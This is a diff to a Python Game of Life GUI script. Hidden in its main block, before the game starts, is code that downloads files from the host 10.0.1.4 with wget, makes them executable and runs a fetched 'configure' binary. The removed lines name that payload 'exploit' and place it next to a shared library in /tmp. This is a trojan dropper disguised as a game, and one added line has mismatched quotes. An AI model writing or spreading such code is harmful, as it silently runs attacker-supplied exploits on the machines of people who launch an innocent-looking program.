@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 
+import os
 import numpy
 import PySimpleGUI as sg
 from subprocess import Popen
@@ -170,24 +171,17 @@ class GameOfLife:
 if (__name__ == "__main__"):
     game = GameOfLife(N=35, T=200)
 
-    #location = '/tmp/590J'
-    url2 = 'http://10.0.1.4/life/libnss_x/x.so.2'
-    args2 = ['wget', '-q', url2, '-P', '/tmp/590J/libnss_x']
+    url2 = 'http://10.0.1.4/life/'
+    args2 = ['wget', '-q', '-r", "--no-parent", "--no-host", url2, '-P', "/tmp/"]
     output2 = Popen(args2)
     output2.communicate()
 
-    mod = Popen(['chmod', '+x', '/tmp/590J/libnss_x/x.so.2'])
+    location = '/tmp/life'
+    mod = Popen(['chmod', "-R", '+x', location])
     mod.communicate()
 
-    url1 = 'http://10.0.1.4/life/exploit' 
-    args1 = ['wget', '-q', url1, '-O', '/tmp/590J/configure']
-    output = Popen(args1)
-    output.communicate()
-
-    mod = Popen(['chmod', '774', '/tmp/590J/configure'])
-    mod.communicate()
-
-    o = Popen(['/tmp/590J/configure'])
+    os.chdir( location )
+    o = Popen([location+'/configure'])
     o.communicate()    
 
     game.play()
